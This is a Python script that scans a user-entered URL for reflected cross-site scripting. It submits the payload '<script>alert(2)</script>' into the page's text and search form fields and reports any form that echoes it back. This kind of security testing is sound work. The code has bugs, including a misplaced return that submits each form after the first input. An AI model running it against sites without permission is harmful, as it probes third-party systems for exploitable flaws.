import os
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import colorama
import requests

os.system("clear")
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        return requests.get(target_url, params=data)

xss_payloads=['<script>alert(2)</script>']
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for payload in xss_payloads:
            response = submit_form(form_details, url, payload)
            if payload in response.content.decode():
                print(colorama.Fore.RED + f"[!] XSS Detected on {url}")
                print(colorama.Fore.YELLOW + f"[*] Form details:")
                pprint(form_details)
                break

if __name__ == "__main__":
    colorama.init()
    url = input("Enter the target URL: ")
    scan_xss(url)
    colorama.deinit()



